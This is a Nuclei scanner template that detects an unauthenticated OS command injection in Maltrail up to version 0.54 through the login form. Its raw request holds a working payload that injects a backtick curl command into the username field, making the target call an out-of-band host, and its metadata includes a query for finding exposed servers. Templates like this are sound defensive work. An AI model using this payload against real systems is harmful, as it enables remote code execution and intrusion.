http:
- matchers:
  - condition: and
    dsl:
    - contains(body,'Login failed')
    - contains(interactsh_protocol,'dns')
    - contains(content_type, "text/plain")
    type: dsl
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Origin: {{RootURL}}

    Referer: {{RootURL}}


    username=;`curl {{interactsh-url}}`

    '
id: maltrail-rce
info:
  author: pussycat0x
  description: 'The subprocess.check_output function in mailtrail/core/http.py contains
    a command injection vulnerability in the params.get("username")parameter.

    An attacker can exploit this vulnerability by injecting arbitrary OS commands
    into the username parameter. The injected commands will be executed with the privileges
    of the running process. This vulnerability can be exploited remotely without authentication.

    '
  metadata:
    fofa-query: 'Server: Maltrail'
    max-request: 1
    verified: true
  name: Maltrail <= v0.54 - Unauthenticated OS Command Injection
  reference:
  - https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
  - https://github.com/stamparm/maltrail/commit/a299967318cc226c18a6a07d1be708e3f21edd39
  remediation: Fixed in 0.55 Version
  severity: critical
  tags: huntr,maltrail,rce,oast,oos,vuln
